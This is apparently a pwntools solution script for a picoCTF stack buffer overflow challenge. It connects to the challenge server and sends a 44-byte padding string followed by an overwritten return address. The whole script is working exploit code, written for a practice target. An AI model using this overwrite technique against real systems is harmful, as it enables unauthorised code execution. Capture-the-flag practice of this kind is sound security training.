from pwn import *

p = remote('saturn.picoctf.net',49684)

overflow='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'

print( p.recvuntil(':'))

p.sendline(overflow)

p.interactive()
